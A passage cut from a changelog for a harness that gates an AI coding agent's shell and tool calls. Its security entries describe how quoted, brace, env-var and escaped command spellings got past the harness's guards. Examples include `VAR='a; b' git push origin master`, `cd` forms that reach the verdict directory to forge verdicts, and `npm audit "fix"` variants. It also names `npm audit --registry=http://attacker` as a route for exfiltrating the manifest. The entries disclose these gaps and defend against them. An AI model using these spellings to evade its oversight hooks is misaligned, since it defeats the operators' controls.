d"`), and the second gated verb; mutation-probed both ways (guard removed → exactly the 4 differential pins red; both call sites reverted → 11 red: the 8 closure pins, the over-block pin, the corpus property, and the family engagement). **What this does NOT close, pinned as still-open rather than implied:** a shell-boundary character INSIDE the quoted value (`VAR='a; b' git push origin master` — quote-unaware `BOUNDARY_RE` splits the segment before tokenisation ever runs; measured bypass on both master and branch, outside this task's pre-declared budget per its halt criterion); a quoted value containing the literal word `git`/`gh`/`npm`/`harness` as its own token (`VAR='a git b' git push` — the guard's honest cost; byte-identical to master's behaviour, so nothing regressed); backslash-escaped whitespace without quotes (`VAR=a\ b git push`, task `b093911d`'s class); and the RAW regex half, deliberately unchanged (the engine-level fix heals installed manifests on upgrade — note the shipped 0.42.0 binary has NO normaliser at all, so every wrapped spelling here is 0.42.0-bypassable until the next release ships this whole Unreleased batch). **New accepted over-block, decided not discovered:** a quoted assignment inside TEXT at a segment-start position now matches (`echo "a; VAR='x y' git push"` blocks where master allowed) — fail-closed direction, same class the module's KNOWN OVER-MATCHING section documents, pinned as a boundary assertion. Latency (corrected twice in review — the first entry claimed sub-microsecond, the second gave numbers without naming the input shape, which varies the cost by >2x at the same length): 0.6-2µs per `normalizeCommand` call on typical spellings; at `MAX_NORMALIZE_LENGTH` (100k chars) the cost ranges by shape from ~1.2ms (plain command, both sides identical) through ~0.85ms master / ~1.09ms branch (assignment-heavy) to ~2.0ms master / ~2.3ms branch on the worst adversarial quoting shape — linear scaling on every shape, against a 1000ms hook budget.

### Added

- **Cross-build measurements of the Bash prefix parser's cd-target extraction now have a permanent, self-testing instrument: `scripts/measure-bash-prefix-parse.mjs` (`npm run measure:bash-prefix-parse -- --self-test`, then with `--baseline name=path` builds for a real run)** (task `47297478`). The `b093911d` run produced three consecutive measurement corpora that reported "0 lost cd targets" while being structurally incapable of reporting a loss (round 3: the separator-less arm rendered `A=xcd /tmp` and a non-writable cwd silently killed every redirect shape; round 4: exactly the one spelling per separator where the baseline is also null), each time turning into a false safety claim that cost a full review round. The tool hardens that run's `final-audit.mjs` into repo infrastructure: a candidate build of `src/runtime/bash-prefix-parse.ts` is measured against real bash (resolved once to an absolute path with execvp-faithful file/executable checks; the corpus children get a PATH containing ONLY the probe-shim directory, so no corpus command can resolve a real binary via PATH — that constrains lookups, not absolute paths, and the generator emitting no absolute binary paths is what makes "today nothing but the probe shim executes" true; the workspace also runs the shim once up front and fails with a self-naming error if the interpreter path is broken) and at least two baseline builds — duplicate baseline names are rejected instead of silently merging counter buckets. PER-ARM GATE: an arm whose shapes never ran, never entered the target, or whose baseline never hit is reported as proving nothing and is never folded into a total zero; a total that excludes such arms says so instead of printing a bare 0, and the baseline-independent candidate table (per-arm hits, phantoms, wrong targets — attribution down to the spelling) carries the same qualifier for arms that were never observed at all. A rendered legend states what a phantom is (bash did not enter the target ON THIS RUN, which includes a statically present `cd` on a short-circuited `||` branch — conservative for a risk gate, not by itself a parser defect). Both residual weaknesses the run's reviewer named in `final-audit.mjs` are fixed: every baseline keeps independent counters (a loss against two baselines counts against both, no `else if` folding), and a non-null-but-WRONG target is its own failure class for candidate and baselines alike, never a hit — so a wrong-target baseline cannot satisfy the gate either. The instrument proves it can fail before it is believed: the self-test (always run first; `--self-test` runs it alone) rebuilds the round-3 defect on purpose and requires the gate to flag the sabotaged arm as evidence-free via an entered-based delta that parser state cannot satisfy, carries a deliberately blind baseline as a positive control that the BASELINE-NEVER-HIT rung (the round-4 countermeasure) can fire, requires executed redirect shapes (writable-cwd control), and treats a candidate regression on the canonical arm as a loud warning rather than misdiagnosing it as a broken environment. The assertion set is a pure exported function (`evaluateSelfTest`) with its own failure-path unit tests, so a deleted assertion cannot vanish silently. New tests: `tests/scripts/measure-bash-prefix-parse.test.ts` (hermetic audit-core + self-test-assertion + arg-parsing suites with injected referee/parsers, plus a real-bash CLI self-test e2e via the INFRA-allowlisted `node`; the grandchild route is recorded at the spawn guard's residual-exposure note). `bash-prefix-parse.ts` and `command-normalize.ts` carry a MEASUREMENT RULE header pointer scoped to what the tool actually measures — `cdTarget` only; inline-env extraction and `command-normalize.ts`'s target extraction have NO instrument yet and say so. The parser itself is untouched.

- **The drift guard that couples engine-side constants to the shipped manifest is now general, after the same defect shipped twice one day and one file apart** (task `074acf5d`). `432db3d3`'s guard checked one set in one file; `dbc6d303` then put `harness` — itself the gated head token of `deny-kill-switch-bypass` — into a NEW module's inert-consumer allowlist, reverting that policy's quoted-spelling hardening, and the existing guard structurally could not see it. `src/runtime/bash-match-facts.ts` derives the shipped manifest's `bash_match` facts live (which policies declare one, which literal head tokens each anchors on, which verbs) and answers "is this token gated by any shipped policy?" in one call; it throws at module-evaluation time when a policy is added, removed or renamed, so the curated map cannot drift silently. `src/runtime/bash-match-registry.ts` registers each engine-side set with a declared intent (`covers-gated-head-tokens` or `must-not-contain-gated-head-token`) and checks every registration against those facts. Both historical incidents are pinned as regressions and were re-verified by an independent reviewer against the REAL registrations, not fixtures. An unregistered exported set in the runtime layer reddens the guard, and the scan carries fixture-tree positive controls so it cannot rot into a no-op unnoticed. No runtime matching path changed. **What this does NOT catch, named verbatim in the module's LIMITS section rather than implied:** three independent adversarial review passes each found a way to register a set the registry accepts and should not, and the fix rounds were stopped after the third on a pre-declared criterion rather than adding a fourth check. Open and measured end to end: a covers registration declaring only `documented-uncovered` gated tokens (`env`, `unset`, `tee`, `cp` — four of the eight) passes every check with an entirely honest, live-coupled registration, which is precisely the `dbc6d303` shape; a registration's `has()` predicate is never cross-checked against the constant its `id`/`module` names, and the `must-not-contain` arm — where that shape lives — has no predicate check at all; `members` may declare coverage the predicate rejects, and `members: []` typechecks; a registration may name a module or id no exported constant matches. The redundancy check additionally forbids legitimate defence-in-depth double coverage, and five `new Set([...])` spellings (`as const`, a comment between `(` and `[`, backtick-quoted elements, union-literal annotations, a trailing comma) escape the scan by design rather than by oversight. Treat the registry as a tripwire for the accidental case, never as a boundary against a determined one; the registration surface is being redesigned to derive from the constant instead of accepting a self-description (follow-ups `209e6dc4`, `26c1d33e`).

### Changed

- **All agent-facing references to the grounding MCP tool prefix renamed from `mcp__agent-grounding__*` to `mcp__grounding-mcp__*`, matching the canonical registration name `grounding-mcp` that 0.42.0's doctor convention checks** (task `ca9b0026`). Since 0.42.0 stopped emitting `mcpServers` into `settings.json`, the documented registration path is `claude mcp add-json --scope user grounding-mcp ...`, and a session registered that way exposes its tools as `mcp__grounding-mcp__*` — but every `verb:`/`producers[].example`/`ux.run` line in `FULL_TEMPLATE` and the profiles, plus the solution-acceptance deny/guidance strings, still named the legacy `mcp__agent-grounding__*` prefix from the pre-0.42 project-scope registration, so a canonically-registered session was told to call a tool name it does not have. All 92 references across `src/`, `tests/`, and `docs/` renamed in one sweep. This is presentational only, verified before the change: no PreToolUse matcher, hook, or engine path keys on the tool NAME (the ledger gates read ledger content, which both registrations write identically, since both names spawn the same `grounding-mcp` binary) — so a still-legacy-registered session keeps satisfying every gate after this change, and the only behavioural effect is that guidance now names the tool a doctor-green session actually has. **What this does NOT rename:** references to `agent-grounding` as the REPO/package name in comments and docs, the `VERDICT_DIR_TAIL` filesystem path (`agent-grounding/solution-verdicts` — an on-disk state path, renaming it would orphan existing verdicts), uninstall's recognition of the legacy registration name (`name === "agent-grounding"` in `src/cli/uninstall/index.ts` — needed precisely to clean up pre-0.42 installs), and historical CHANGELOG entries. Existing tests updated in place (same sweep); the FULL_TEMPLATE surface was already pinned (the parity and composer tests now assert the new spelling), and a new repo-wide guard test (`tests/no-legacy-mcp-prefix.test.ts`) asserts the literal legacy prefix does not reappear anywhere under `src/` — added after review measured that a partial revert of the non-template surfaces (profiles, hook guidance strings) would otherwise ship green. Operator action (corrected in review: `harness apply` does NOT do this — it never rewrites `harness.yaml`, and the deny-time guidance is rendered straight from the loaded manifest): the pack-hook messages update on package upgrade with no operator step, but an EXISTING manifest keeps the legacy `verb:`/`producers[].example`/`ux.run` spellings until the operator re-runs `harness init` or edits `harness.yaml` by hand; sessions still on the legacy project-scope registration should re-register per `harness doctor` and drop the legacy entry.

## [0.42.0] - 2026-07-27

### Security

- **The Risk Classifier's and understanding-gate's shared built-in read-only floor (`src/runtime/read-only-bash.ts`) now recognizes `cd` and a curated npm read-only subcommand set, closing a gap that let a prod-scoped `risk.severity_at_least` policy block plain navigation and dependency-tree reads on a production-resolved session — with two adjacent security fixes surfaced by adversarial review before this shipped** (task `fb67b402`). `cd` (pure navigation form only — any chained or redirected spelling still forfeits the classification via the existing shell-metacharacter guard) and `npm ls` / `list`, `view` / `info` / `show`, `outdated`, `why` / `explain`, `ping`, and `npm audit` (never `npm audit fix`) are now floored `low`-severity instead of unclassified, the same treatment `git status` / `git diff` already got. This is a curated POSITIVE allowlist, not a denylist: an npm subcommand this floor has not reasoned about — `install`, `ci`, `publish`, `update`, `version`, or a future verb — stays unclassified rather than assumed safe. This same shared classifier also feeds the understanding-gate's PreToolUse blocker (`isReadOnlyBashPipeline`), which now also passes `cd` / `npm audit` / `npm ls` without an approved Understanding Report — a deliberate widening, not incidental; see `docs/policy-packs/understanding-before-execution.md` for why, and its consciously-accepted pre-report network-read residual (already true of `git fetch` / `gh ... view`).
  - **Fixed before ship (HIGH, adversarial review, round 1): the solution-acceptance anti-forgery write-guard's `cd`-into-verdict-dir block only closed the LITERAL-path spelling.** `cd`'s general read-only classification meant `src/cli/pack/hook-solution-acceptance-writeguard.ts`'s `evaluateWriteGuard` needed its own defense-in-depth pre-check so a bare `cd <verdict-dir>` — the setup half of a two-Bash-call forge — stays blocked (the actual forging write is separately closed by the pre-existing cwd-inside-dir check on the following call, which is unaffected and remains the load-bearing defense). The FIRST version of that pre-check only caught the literal, unquoted path spelling: `path.resolve` cannot literally evaluate a quoted (`cd "$DIR"`, `cd '$DIR'`), env-var/brace (`cd $SOLUTION_VERDICT_DIR`, `cd $HOME/...`, `cd ${HOME}/...`), tilde (`cd ~/...`), or glob (`cd .../solution-ver*`) spelling, so each of those seven forms silently took `cd`'s unconditional read-only fast path instead of reaching the existing text-reference check that already recognized every one of those spellings for any OTHER (non-cd) Bash command. Fixed: a `cd` target containing `$ ~ * ? [ " '` now skips the read-only fast path entirely and falls through to the same `bashReferencesVerdictDir` check, closing all seven spellings without reverting `cd`'s general classification.
  - **Fixed before ship (MEDIUM, adversarial review, round 1): `npm audit "fix"` (and other shell-quoted spellings) floored as read-only.** The original `npm audit` guard was a token-equality denylist (`!tokens.slice(2).includes("fix")`) — a shell-quoting bypass, since npm's own arg parsing strips quoting before npm ever sees the argument, so `npm audit "fix"`, `'fix'`, `f''ix`, `fi"x"`, and `$'fix'` all run the mutating `npm audit fix` path in npm 11.17.0 while none of the raw, un-shell-evaluated tokens equals the literal string `fix`. Fixed with a POSITIVE shape instead, matching the module's allowlist-not-denylist contract: every token after `audit` must either start with `-` (a flag) or be the literal `signatures`, or the whole invocation forfeits the floor — closing every quoting variant and any future `npm audit <verb>` in one rule, at the acceptable, conservative cost of failing closed on any separated flag value (e.g. `npm audit --audit-level high`, `npm audit --omit dev` — use the glued `--flag=value` form to stay floored). Also added, same round: `--registry` / `--userconfig` / `--globalconfig` on ANY npm subcommand forfeits the floor (`npm audit --registry=http://attacker` would otherwise submit the full dependency manifest to an operator-unverified host); `info`, `show` (both `view` aliases) and `explain` (`why`'s formal name) joined the npm allowlist; other npm aliases (`la`, `ll`, `v`) are deliberately NOT floored, only canonical spellings.
  - **Fixed before ship (HIGH, adversarial review, round 2): the round-1 `cd` fix's unresolvable-character set missed brace expansion, a ninth live spelling.** `CD_TARGET_UNRESOLVABLE_CHARS` had no `{`, `}`, or `,`, so `path.resolve` treated `cd <parent>/{solution-verdicts,x}` as a literal (non-existent) path segment — neither inside the dir nor flagged unresolvable — and the read-only fast path fired even though bash (verified against 3.2.57) expands the brace and navigates INTO the verdict dir, ignoring the extra alternative; the `-P` / `--` prefixed and cwd-relative forms were equally affected. Fixed in two parts: (1) `CD_TARGET_UNRESOLVABLE_CHARS` now includes `{ } ,`, so any brace-expansion spelling falls through to the reference check same as the other six spellings; (2) `bashReferencesVerdictDir`'s glob-metacharacter test (`src/policy-packs/builtin/solution-acceptance-runtime.ts`) widened from `/[*?[]/` to `/[*?[{]/` so the leaf-word fallback also catches a brace that SPLITS the leaf itself (`solution-verdict{s,}`), a narrower pre-existing hole (not `cd`-specific, not introduced by round 1) the same widening closes. Also this round: the per-scope npm registry override `--@scope:registry=URL` (npm resolves a scoped package's registry from `@scope:registry` before the plain `registry` config, so it is an equally live exfiltration vector) now forfeits the npm floor alongside the unscoped form; `cdTargetArgument` now strips one layer of surrounding quotes before either check runs, so `cd "<dir>-decoy"` behaves like the unquoted `cd <dir>-decoy` (both correctly NOT blocked) instead of being spelling-dependent; a positive test pins `npm audit -fix` (single dash) as deliberately floored (verified npm behavior: `Unknown cli config "--fix"`, report only); and the module header / relevant docstrings were reworded from enumerating expansions in a way that read as exhaustive to stating explicitly what they DO cover and naming the still-open residual (backslash-escaping a leaf character defeats the textual match under both `cd` and non-`cd` commands alike — pre-existing, needs shell-unescaping in `bashReferencesVerdictDir` to close, out of this task's scope).
  - New tests: `tests/runtime/read-only-bash.test.ts`, `tests/runtime/risk-classifier.test.ts`, `tests/cli/pack-hook-solution-acceptance-writeguard.test.ts` (round 1: 7-spelling + discriminating-pair + near-miss cases; round 2: 6 brace-form negatives + 1 split-leaf negative + the quote-stripped decoy pin). Docs: `docs/risk-gate.md`, `docs/policy-packs/understanding-before-execution.md`.
- **`fast-uri` HIGH advisory (GHSA-v2hh-gcrm-f6hx) closed via a lockfile refresh; `@lannguyensi/understanding-gate` ends this window pinned to `^0.4.9`, after a same-day detour through an exact `0.4.5` pin** (PRs #366, #367). The advisory (host confusion via a literal backslash authority delimiter, fast-uri 3.0.0-3.1.3) reached the harness tree via `understanding-gate -> ajv -> fast-uri`; ajv already declared `fast-uri: ^3.0.1`, which permits the fixed 3.1.4, so refreshing the lockfile pin closed the advisory — no `package.json` change was needed for the advisory itself. Bumping `understanding-gate` itself (0.4.5 -> ^0.4.7, resolving 0.4.8) was evaluated and REJECTED on evidence: it shares the same `ajv: ^8.12.0` constraint (doesn't touch the advisory) and breaks `tests/cli/approve-understanding.test.ts` (persisted `taskId` comes back as the `sessionId`; bisected 0.4.6 green, 0.4.7/0.4.8 red). PR #366 pinned `understanding-gate` to an EXACT `0.4.5` to hold that line through `npm install`/`npm update`, not just `npm ci` (`~0.4.5` still admits the broken 0.4.7). PR #367 lifted the pin once `understanding-gate` 0.4.9 shipped: it restores the documented gap-fill contract for `defaults.taskId` (agent-grounding PR #153) with its own regression test, so the consumer suite is no longer the only detector — verified via `tests/cli/approve-understanding.test.ts` 70/70 against 0.4.9 plus a full preflight run.
- **`postcss` HIGH advisory (GHSA-r28c-9q8g-f849) closed via `npm audit fix`** (PR #374). `postcss` <= 8.5.17 is vulnerable to path traversal via `sourceMappingURL` auto-loading, disclosing arbitrary `.map` files; it reaches this repo transitively as a dev dependency only (`vitest 4.1.8 -> vite 8.0.16 -> postcss 8.5.15`). Closed non-breaking: `postcss` 8.5.15 -> 8.5.23 and its `nanoid` dependency 3.3.12 -> 3.3.16, no `package.json` change and no override introduced. `npm audit` now reports 0 vulnerabilities; this also unblocked this repo's own `harness preflight`, whose npm-audit check had been failing on exactly this advisory.

### Added

- **Third `SessionStart` companion: a toolchain-parity snapshot, advisory-only, compared against peer machines** (task `5427fe54`, PR #368). Alongside the existing preflight and branch-check `SessionStart` hooks, it writes this machine's toolchain snapshot (PATH-resolved node version, npm globals, OW-Kit manifest version, MCP server names) to the machine-state directory synced by `agent-memory-sync`, compares the live local state against every peer snapshot found there, and reports drift as warn lines plus a `toolchain-parity:ok|drift:<n>` ledger fact. Disabled by default behind a new optional `toolchain_parity` manifest block; every failure path logs and exits 0 rather than blocking the session. Both new spawns are injectable and registered in the hermetic spawn guard. A same-PR review note documented the constraint that profile names must stay unique after filename sanitization (`[^a-zA-Z0-9._-]` -> `-`), naming plain names like `mac-mini`/`macbook` as safe — this is a docs-only clarification, not a code fix: `sanitizeProfileName` gained no collision guard (LOW-1). `check:duplication`'s `MAX_CLONES` pin moved 86 -> 95: the CLI option-parsing wiring joins the existing clone cluster shared verbatim with the sibling hooks (justified in `scripts/check-duplication.mjs`). New tests: 32 hermetic tests covering ok, drift, missing/corrupt peers, unconfigured, and spawn-degradation cases. Docs: `docs/CLI.md`, `docs/examples/full-manifest.expected.yaml`.
- **New opt-in `post-merge-gate` policy pack: denies mutating git/gh work on a branch whose tip has already been merged** (task `d368e30d`, PR #369). A `PostToolUse` producer records the merged branch tip only on a confirmed `gh pr merge` success (`tool_output.exit_code === 0`, a defensive payload read, the trusted ledger writer), and a `PreToolUse` blocker denies a curated git/gh mutation list once the current branch tip exactly matches a recorded merged tip. An escape allowlist (`git switch`/`checkout`/`pull`/`fetch`/`branch -d`/`-D`/`stash list`/`show`, harness verbs) is checked first, unconditionally, before any manifest or ledger access, and the gate fails open with a warning when the ledger is unavailable. Exact-sha matching keeps it squash-safe and avoids false positives on post-merge commits or recycled branch names. `resolveOriginHeadBase`/`resolveCommonDir` moved to the new `src/runtime/git-context.ts` for reuse; MCP-side merges stay a documented gap. Ships disabled (`FULL_TEMPLATE enabled: false`). A same-PR review round named two accepted residuals in `docs/policy-packs/post-merge-gate.md`: a curated mutation chained with an escape verb is allowed whole (the same accepted class as the existing eval/heredoc gap), and a hand-written merged fact matching the current tip denies curated mutations on that branch, recoverable via any escape or a new commit. `check:duplication`'s `MAX_CLONES` pin moved 95 -> 102 (sibling-pack wiring shape, no cross-verb extraction possible).
  - **Fixed the same day (PR #370): the documented `tool_output.exit_code` producer contract never actually fires on real Claude Code.** Live verification on Claude Code 2.1.218 (a real hook fire against an isolated settings probe) showed the `PostToolUse` payload is `tool_response` — `{stdout, stderr, interrupted, isImage, noOutputExpected}`, no exit code at all — so the producer shipped in PR #369 was silently inert against the actual runtime. Contract A (`tool_output.exit_code === 0`) stays authoritative and short-circuits when present; a new Contract B confirms via `tool_response` with `interrupted: false` and `gh`'s past-tense success line, matching both the real glued `owner/repo#N` shape (source-verified against `gh` v2.94.0's `merge.go:369-376`, which writes success to stderr via `infof`) and the bare `#N` doc shape. Auto-merge-pending and already-merged warnings are pinned as negatives against `gh`'s exact wording. The real 2.1.218 payload is committed as a drift-guard fixture (`tests/fixtures/post-merge-gate/real-posttooluse-payload-2.1.218.json`).
  - New tests: `tests/cli/pack-hook-post-merge-gate.test.ts`, `tests/cli/pack-hook-post-merge-gate-record.test.ts`, `tests/policy-packs/post-merge-gate-expand.test.ts`, `tests/policy-packs/post-merge-gate-runtime.test.ts` (escape-first ordering, chained-escape and inverted-trust-boundary pins, both payload contracts, the fixture-driven drift guard). Docs: `docs/policy-packs/post-merge-gate.md`.
- **CI now fails fast on a committed `.only` under `tests/`** (task `b4845053`, follow-up of task `052f9d5b` review round 4, PR #372). `vitest` with `CI=true` (`allowOnly=false`) reports an unexpected `.only` but still exits 0 for some file shapes, and a `describe.only` whose selected tests are all skipped disables both layers of the hermetic-spawn backstop at once. The new `scripts/check-no-only.mjs` parses `tests/**/*.{ts,mts,cts}` with the TypeScript compiler API and flags `.only` property accesses rooted at a bare `describe`/`it`/`test` identifier, so chained modifiers and `.each` variants are caught while strings, comments, and test names structurally cannot trip it. Wired as `check:no-only`, a fail-fast CI step before Build, ~0.9s for the whole test tree. A same-PR review round added the vitest options-object form (`it(name, { only: true }, fn)`, a documented way to activate only-mode that defeated the property-access gate the same way) and hardened the check's CLI with an `isDirectRun` guard and in-process tests (exit code + `file:line` output); accepted known bypasses (bracket/computed access, an aliased holder, a renamed import, `bench.only`, and the options form reached through a chained call) are documented in the script itself.
- **`harness preflight`'s `SessionStart` producer now persists the full failing run to a log file, and the not-ready message names which checks failed** (task `31fbf856`, PR #356). On a real `ready !== true` outcome, the producer writes the complete `preflight run --json` payload (pretty-printed) to `~/.harness/logs/preflight-<repo>-<timestamp>.json` (an injectable `logDir` seam) and keeps only the last 20 `preflight-*.json` files per rotation, leaving any foreign files in that directory untouched. The `SessionStart` fail message itself now surfaces up to 3 detail lines per failing check plus a trailing `; log: <path>` pointer, instead of just the bare check name. The `ready:true` and spawn-error branches are unchanged, and every new file-IO path degrades to a note on failure rather than breaking the `SessionStart` `blocking:false` / exit-0 contract. A companion root-fix to `agent-preflight`'s own output capping is tracked separately as task `6691dd56`. New tests: `tests/cli/session-start/preflight.test.ts`.
- **New `harness record` CLI verbs write gate evidence directly into the session ledger for `review`, `review-subagent`, and `dogfood`** (agent-tasks task `27ba3570`, PR #357). Each verb writes one multi-tag fact, mirroring the existing preflight producer: `review` writes `review:<pr>` + `review:<branch>` + `review:<base>`; `review-subagent` writes `review-subagent:<task>` + `review-subagent:<branch>` + a verdict tag; `dogfood` writes `dogfood:<session>`. Branch resolution shares `resolveGitContext` with the gates that consume these tags; base resolution tries `--base`, then an `origin/HEAD` filesystem fallback, then omits loudly rather than guessing — a review follow-up made that fallback resolve `origin/HEAD` through a linked worktree's commondir file too, so a worktree checkout no longer silently degrades to omit-with-warning. The manifest -> `grounding-mcp` ledger-writer wiring was extracted into the new `src/runtime/ledger-writer.ts`, shared unchanged with `session-start`. The evidence-gate `ux.run` hints across all four manifest sources (`templates.ts`, `composer.ts`, `profiles.ts`, `docs/examples/full-manifest.yaml`) now point at the `record` verbs instead of the old hand-written instructions. An invalid `--ledger-timeout` now warns instead of silently falling back. New tests: `tests/cli/record/record.test.ts`, `tests/cli/record/record-alias.test.ts`, `tests/e2e/record-roundtrip.test.ts` (real record runners feeding the real intercept path, both merge surfaces, empty-ledger deny counter-checks). Docs: `docs/CLI.md` (tag-semantics table, merge-surface trap, `--base` guidance), `docs/okf/evidence-ledger-trust-boundary.md` (re-verification pass).
- **`harness uninstall --apply` (and `--restore-from`) now deregisters harness-owned MCP servers from the live `claude mcp` registry, not just the `settings.json` block** (task `d6086441`, PR #361). It calls `claude mcp remove --scope user` for harness-owned names (`DEFAULT_OWNED_MCP_SERVERS` union the manifest's `tools.mcp[]` names) that are actually registered in the live user-scope registry — read-only checked via `readTopLevelMcpServers` first, never a blind iteration — and foreign registrations are never touched. `--dry-run` lists the planned removals with zero exec calls. `cli-missing` and per-name failures never hard-fail: outcomes land in inventory warnings with copy-pasteable `manualRemoveLines` fallback commands, and the result distinguishes a partial success (settings.json cleaned, registry removal failed or skipped) from a complete one; a registry read error removes nothing. `uninstall()` is now async; its only in-repo caller (the CLI command) awaits it and prints the new registry fields. A review-round fix seatbelted the registry axis the same way `stateDir` already is: an explicit `homeDir` or an injected `mcpExec` each neutralize the risk on their own, and absent both, only `HARNESS_ALLOW_REAL_GENERATED_DIR=1` unlocks it (set by `src/cli/main.ts` for the real binary, so production behavior is unchanged) — a blocked run skips the axis entirely, including the read, and reports an empty list plus a warning. New tests: `tests/cli/uninstall/uninstall.test.ts` (seatbelt blocked/env-unlocked/homeDir-unlocked cases, and a `--restore-from` case asserting the exact `claude mcp remove` argv). Docs: `docs/examples/pandora-bootstrap.md` (rollback steps and the manual fallback).

### Fixed

- **`harness init`'s MCP-server registration now writes to the surface Claude Code actually reads, instead of a dead `settings.json` block** (task `init-mcp-wiring-claude-code`). Every prior `harness init --interactive` run projected `tools.mcp[]` into user-level `~/.claude/settings.json`'s `mcpServers` key; Claude Code does not consume that key for user-scope registration and never has — the effective registry is `~/.claude.json`, previously reachable only by hand-running `claude mcp add-json`. The wizard now registers every enabled `tools.mcp[]` server there directly, via `claude mcp add-json --scope user` (new `ensureMcpServers` in `src/io/claude-mcp.ts`, a thin injectable-exec wrapper around `claude mcp add-json/remove/get/list`), right after the hooks apply step, then migrates away the dead settings.json block — but only once registration has actually succeeded, so a missing `claude` CLI leaves existing state untouched and prints copy-pasteable `claude mcp add-json` commands instead of failing or silently doing nothing. `generate-settings.ts` no longer projects `mcpServers` into settings.json at all (the translated spec map is exposed via `GenerateSettingsResult.mcpServers` for the new registration path instead). `harness doctor` gained a "Claude Code MCP Registration" section that re-verifies the live registry via `claude mcp list` and flags a leftover dead settings.json block. **Known limitations, tracked as follow-ups, not fixed by this task:** no removal GC — toggling a `tools.mcp[]` entry to `enabled: false` (or deleting it from the manifest) does not deregister an already-registered server (since closed in this same Unreleased batch by task `363a6de0`, see below); no `uninstall` symmetry — `harness uninstall` still only cleans the settings.json block, not the live `claude mcp` registration it now creates (since closed by task `d6086441`, see the Added section above); `harness init --probe`'s detection and `harness adopt`'s MCP drift check still read the (now largely dead) settings.json block rather than the live registry (since closed in this same 0.42.0 batch by task `83d8d03a`, see below). New tests: `tests/io/claude-mcp.test.ts` (43 cases), plus updates to `tests/cli/init-interactive.test.ts`, `tests/cli/apply/apply.test.ts`, `tests/cli/apply/generate-settings.test.ts`, `tests/cli/adopt.test.ts`, `tests/cli/doctor-claude-mcp.test.ts` (new), and `tests/cli/doctor.test.ts`. Docs: `docs/ARCHITECTURE.md`, `docs/examples/pandora-bootstrap.md`, `README.md`, `docs/okf/debug-verb-selection.md`.
- **`harness init --interactive`'s claude-code wire-now step now deregisters a `tools.mcp[]` server that was removed or disabled from the manifest, closing the "no removal GC" gap the `init-mcp-wiring-claude-code` entry above tracked as a known limitation** (task `363a6de0`). Every ensure run used to only add/replace `desired` servers, never remove one that fell out of `desired` — an operator who deleted or disabled a `tools.mcp[]` entry had to run `claude mcp remove` by hand. `ensureMcpServers` (`src/io/claude-mcp.ts`) gains an opt-in `gc: { ownedNames }` option: after reconciling `desired`, it additionally `claude mcp remove`s any name in `ownedNames` that is still registered but no longer in `desired`; omitting `gc` leaves behavior exactly as before. **Ownership criterion (read this before relying on it):** the wizard passes `ownedNames` = the CURRENT manifest's `tools.mcp[]` names UNION the `tools.mcp[]` names from the `.last-apply` manifest snapshot captured **before** this run's `apply()` executes (`apply()` re-stamps `.last-apply` with the just-edited manifest whenever anything changed — including an edit that also touches a hook — so capturing the snapshot first is what lets a combined "remove this MCP + change this hook" edit still GC the dropped server correctly). The uninstall module's `DEFAULT_OWNED_MCP_SERVERS` list (`agent-tasks`, `codebase-oracle`, `grounding-mcp`) is **deliberately excluded** from GC eligibility: a server sharing one of those names that the operator registered themselves — outside of, or before, any harness manifest on this machine — is never touched, because "shares a default name" is not the same claim as "this install's manifest once had it." A manifest entry that's merely drifted (registered content differs from the manifest spec) but is STILL present in `desired` is never a GC candidate either, regardless of ownership — the existing add/replace path re-syncs it instead. No snapshot available (fresh install, or a corrupt/pre-snapshot `.last-apply`) degrades conservatively to manifest-only ownership, never a guess. A repeat run with no manifest change makes zero additional `claude mcp remove` calls (same idempotence bar as the add/replace path); a `claude` CLI that's missing, times out, or the registry being unreadable are all reported as a warning with copy-pasteable `claude mcp remove --scope user <name>` fallback commands (new `manualRemoveLines` in `src/io/claude-mcp.ts`), never a hard failure. New tests: 9 cases added to `tests/io/claude-mcp.test.ts` (7 for the `gc` option — remove branch with exact commands, ownership boundary, still-desired/drifted-content protection, idempotence, registry-read-error, cli-missing, gc-omitted-is-unchanged — plus 2 for `manualRemoveLines`), plus 5 new wizard-level tests in `tests/cli/init-interactive.test.ts` (the `.last-apply` snapshot union, the conservative no-snapshot fallback, the `DEFAULT_OWNED_MCP_SERVERS`-exclusion guard across a profile switch, an apply-succeeds MCP-only edit, and a combined MCP-removal + new-pack/hook edit). Docs: `docs/ARCHITECTURE.md`.
- **`persistStdinReport`'s parse-error log now carries `malformedSections`; the schema hint spells out the `(list)` rule** (task `7e29e5d7`, externalRef `be98cd96:followup-harness-log-field`, follow-up to agent-grounding PR #154, PR #373). `understanding-gate`'s `ParseError` grew an optional `malformedSections` field (a `(list)` section is present but its body is prose); `persistStdinReport` now carries it into the parse-error log with a defensive `?? []` default, harmless against the pinned 0.4.x line. `renderReportSchemaHint` now states explicitly that `(list)` sections need markdown list items (`'- '` or `'1.'`) and that prose bodies are rejected — the stumbling block of the 2026-07-22 live incident. New tests: `tests/cli/approve-stdin-report.test.ts`, `tests/cli/pack-understanding-report-schema-hint.test.ts`.
- **`harness adopt`'s MCP drift check and `harness init --probe`'s team/full detection now read the effective Claude Code user-scope registry instead of the dead `settings.json` block** (task `83d8d03a`, PR #358, closes a known limitation the `init-mcp-wiring-claude-code` entry above named). Both consumers now share the exported `readTopLevelMcpServers` primitive to read the live, top-level `mcpServers` block in `~/.claude.json` (`CLAUDE_CONFIG_DIR`-aware) — no new writer on `~/.claude.json` and no `claude` CLI spawn in either path. The dead `settings.json` block is still detected, but surfaced only as a cleanup warning, never mistaken for drift. `AdoptResult` gains `deadSettingsMcpNames` and `registryReadError`; `detect` gains `mcpRegistryParseError` and drops the now-dead `settingsParseError` field. New tests: updates to `tests/cli/adopt.test.ts`, `tests/cli/init-detect.test.ts`, `tests/cli/init-interactive.test.ts`, `tests/cli/program.test.ts`.
- **All 8 OKF knowledge-bundle docs were re-verified against current sources, with several corrections substantive rather than just line-number drift** (PR #353, task `93c004a6`, first upkeep sweep after the warn-only staleness watch went live).

## [0.41.0] - 2026-07-16

### Security

